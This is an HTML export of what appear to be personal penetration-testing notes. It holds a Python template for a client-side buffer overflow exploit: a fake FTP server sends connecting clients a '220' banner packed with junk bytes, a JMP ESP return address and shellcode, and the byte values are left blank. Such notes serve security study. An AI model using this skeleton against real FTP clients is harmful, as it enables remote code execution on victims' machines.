<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>send payload for Buffer Overflow application(single message)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>send payload for Buffer Overflow application(single message)</h1><br/><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br /><br />from socket import *<br /><br />payload = <span style="color:#3ad900;font-weight:400">&quot; &quot;</span>  <span style="color:#0088ff;font-weight:400">#hexadecimal Junk Bytes needed to reach the EIP</span><br />payload+=<span style="color:#3ad900;font-weight:400">&quot; &quot;</span>  <span style="color:#0088ff;font-weight:400">#overwrite EIP address with the address of the JMP/CALL ESP, hexadecimal in swapped order because we are in little-endian</span><br />payload+=<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot; &quot;</span><span style="color:#ff9d00;font-weight:700">)</span> <span style="color:#0088ff;font-weight:400">#Shellcode, this is the code that we want execute on the target machine if the Buffer Overflow works</span><br /><br />s = socket<span style="color:#ff9d00;font-weight:700">(</span>AF_INET, SOCK_STREAM<span style="color:#ff9d00;font-weight:700">)</span><br />s.bind<span style="color:#ff9d00;font-weight:700">((</span><span style="color:#3ad900;font-weight:400">&quot;0.0.0.0&quot;</span>, 21<span style="color:#ff9d00;font-weight:700">))</span><br />s.listen<span style="color:#ff9d00;font-weight:700">(</span>1<span style="color:#ff9d00;font-weight:700">)</span><br />print <span style="color:#3ad900;font-weight:400">&quot;[+] Listening on [FTP] 21&quot;</span><br />c, addr = s.<span style="color:#ffdd00;font-weight:400">accept()</span><br /><br />print <span style="color:#3ad900;font-weight:400">&quot;[+] Connection accepted from: %s&quot;</span> % <span style="color:#ff9d00;font-weight:700">(</span>addr[0]<span style="color:#ff9d00;font-weight:700">)</span><br /><br />c.send<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;220 &quot;</span>+payload+<span style="color:#3ad900;font-weight:400">&quot;\r\n&quot;</span><span style="color:#ff9d00;font-weight:700">)</span>  <span style="color:#0088ff;font-weight:400">#once the client connect with this server listener, this server reply with 220 code</span><br />                               <span style="color:#0088ff;font-weight:400">#followed by our payload</span><br />c.recv<span style="color:#ff9d00;font-weight:700">(</span>1024<span style="color:#ff9d00;font-weight:700">)</span><br />c.<span style="color:#ffdd00;font-weight:400">close()</span><br />print <span style="color:#3ad900;font-weight:400">&quot;[+] Client exploited !! quitting&quot;</span><br />s.<span style="color:#ffdd00;font-weight:400">close()</span></pre></div> <br /></div>
</body>
</html>
